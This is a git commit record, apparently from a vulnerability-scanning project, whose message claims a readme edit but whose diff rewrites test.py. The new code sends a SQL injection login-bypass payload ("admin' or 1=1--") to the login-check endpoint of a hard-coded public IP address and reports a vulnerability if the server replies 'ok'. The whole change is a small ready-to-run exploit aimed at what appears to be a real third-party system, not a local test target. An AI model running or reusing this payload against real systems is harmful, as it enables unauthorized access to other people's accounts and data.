2231747eb791d225b072aec39b7e54fec94d0849
Cl0udG0d <2585614464@qq.com>
2021-06-25 13:41:15 +0800

    修改readme

--- test.py
+++ test.py
@@ -1,3 +1,10 @@
-from POCScan import selfpocscan2
+import requests
 
-selfpocscan2.AngelSwordMain("127.0.0.1", "http://127.0.0.1/")
+data={
+    'strName':"admin' or 1=1--",
+    'strPwd':''
+}
+url='http://223.68.174.194:8888/Login/Check'
+rep=requests.post(url,data=data)
+if rep.text=='ok':
+    print("存在漏洞")
